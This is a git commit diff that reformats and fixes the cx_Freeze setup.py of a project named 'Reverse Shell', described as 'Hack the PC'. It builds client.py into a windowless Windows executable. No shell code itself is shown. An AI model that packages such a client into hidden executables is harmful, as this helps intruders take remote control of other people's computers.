073a7e831af0b45d52d55293d65a7b3d5a7e7f94
Paul Badalian <Paul Badalian>
2015-12-21 21:19:46 -0800

    Fixed setup.py file

--- setup.py
+++ setup.py
@@ -7,4 +7,8 @@ base = None
 if sys.platform == "win32":
     base = "Win32GUI"
 
-setup(name="Reverse Shell", version="0.1", description="Hack the PC", options={'build_exe': {'include_files': include_files}}, executables=[Executable("client.py"), base=base])
+setup(name="Reverse Shell",
+      version="0.1",
+      description="Hack the PC",
+      options={'build_exe': {'include_files': include_files}},
+      executables=[Executable("client.py", base=base)])
